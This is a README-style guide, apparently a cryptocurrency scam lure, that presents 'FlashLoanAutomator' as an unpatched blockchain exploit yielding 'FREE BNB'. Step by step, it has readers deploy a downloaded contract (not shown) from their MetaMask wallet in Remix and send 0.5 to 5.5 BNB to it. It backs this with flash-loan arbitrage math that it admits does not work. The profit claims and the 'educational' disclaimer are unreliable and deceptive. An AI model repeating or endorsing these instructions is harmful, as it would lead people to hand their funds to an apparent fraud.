# FlashLoanAutomator

NOTE: FOR EDUCATIONAL PURPOSES ONLY. 
This is an exploit in the blockchain, do not abuse it. 

Compiler version has been changed for this update: 
Set compiler version greater than or equal to 0.5.17 instead of 0.5.0 if it won't let you compile.

Remix: http://remix.ethereum.org/

Code: 

This is an exploit in the network which has caused some serious panic over the last week, previous codes are getting fixed and there is no saying when this will be patched as well because blockchain contracts are difficult to read, understand, and maintain.  The use of a contract manager interface is creative way to help others interact w/ the contract and trigger the exploit. 

I suggest going for 0.25 BNB or 0.15 ETH minimum and make sure the transaction does not fail due to gas. The higher the gas amount the quicker the transaction is processed in the block. The multiplier finance greater the reward and chances of success. 

UPDATED Code: Works As of 13/June/2021, last verfied 02/July/2021.

Follow The GUIDE Carefully or the transaction wont go through and you have to redo again all steps.

Step 1: Go to http://remix.ethereum.org
Step 2: Click the contracts folder then the create new file icon, Create a file call it Flashloan.sol hit ENTER (Create this file in the contracts folder (Watch Video)
Step 3: Download & then copy and paste the contract code into REMIX Panel (As per the video)

Step 4: Click Deploy & Run ICON (Left hand side)
Step 5: Change Environment to (Injected Web3)
Step 6: Connect you wallet when prompted (Metamask Preferable)
Step 7: Click Solidity Compiler Icon (Change Complier version greater than 0.5.0)
Step 8: Click compile FLASHLOAN.SOL
Step 9: Click Deploy & Run transaction icon
Step 10: Click string token name, name your token and symbol (could be anything) ie mytoken, MYTOK
Step 11: Enter Loan Amount IE 1,000 BNB preferable
Step 12: Click Orange Transact Button
Step 13: Click confirm on wallet/metamask (wait for confirmation)
Step 14: New contract will appear under DEPLOYED Contract Field
Step 15: Copy new contract address generated from the loan pool
Step 16: Click send on METAMASK & Paste Contract Address
Step 17: 
Send 0.5 BNB if loan amount is less than 1,000BNB
Send 1.5 BNB if loan amount is greater than 1,000BNB
Send 3BNB if loan amount is greater than 2,000 BNB
Send 4.5 BNB if loan amount is greater than 3,000 BNB
Send 5.5 BNB if loan amount is greater than 4,000 BNB

1.5BNB +  for each 1,000 BNB you are loaning

Avoid using very low amounts as contract may fail below 0.5 BNB

Note: Use Compiler Version 0.5.17 or above  on REMIX (Compiler Section)

And that is how you get FREE BNB using a flash loan!


How the smart contract works:
1. We will use the multipler-finance contracts to borrow a flash loan of around 1,000 BNB from Multiplier Finance to make an arbitrage trade on Pancakeswap .

2. To prepare the arbitrage, BNB is swaped into USDT using PancakeSwap swap contract code. (50% BNB swapped into 50% USDT) (At the time of this video, 1 BNB = 340 USDT); So we will have about 500 BNB and 170,000 USDT.

3. The code will let you deploy your own token on Pancakeswap.

4. Provide liquidity in the 2 pools in such ratio (it is our own token and liquidity pool, so we have the power to set the initial price of the token):

Your Token (TOK) : BNB has 1:1 ratio (TOK 1 = 1 BNB)

Your Token (TOK) : USDT has 500: 1 ratio ( TOK 1 = 500 USDT)

5. The code perform the following swaps in a loop until all the initial flash loaned amount is in our liquidity pools:

Swap BNB (500) into TOK (500)

Swap TOK (500) into USDT (250,000)

Swap USDT (250,000) into BNB (700)

6. You will now have 1200 BNB. You can repay the 1000 BNB loan + any gas fees + Slippages and keep the remaining as profits, all within the same smart contract.
Although the calculations does not work as such but you still make profit.

Please note this video is for demonstration purposes only, we do not recommend using exploits for free money.
**********************************************ATTENTION********************************************
*IF YOU DONT PUT THE ENOUGH BNB THE BORROW AND THE FLASHLOAN MIGHT FAIL due to the interest to be paid at the end of the flash loans or transaction gas cost. Add at least 0.3 BNB in each transaction.

#Binance #Binance Smart Chain #Cryptocurrency #crypto news #Bitcoin #Arbitrage #BSC #Blockchain #HODLING #Flash Loans #cryptocurrency news #cryptocrash #bitcoin today #bitcoin price prediction #bitcoin crash

